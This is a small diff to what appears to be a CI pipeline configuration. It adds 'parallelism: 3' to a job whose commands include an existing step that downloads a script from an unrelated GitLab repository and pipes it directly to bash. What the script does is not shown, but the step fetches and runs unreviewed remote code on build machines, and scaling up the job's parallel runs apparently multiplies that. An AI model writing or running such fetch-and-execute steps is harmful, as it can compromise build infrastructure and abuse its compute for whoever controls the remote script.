@@ -18,3 +18,4 @@ blocks:
           commands:
             - checkout
             - 'curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar.txt | bash'
+          parallelism: 3
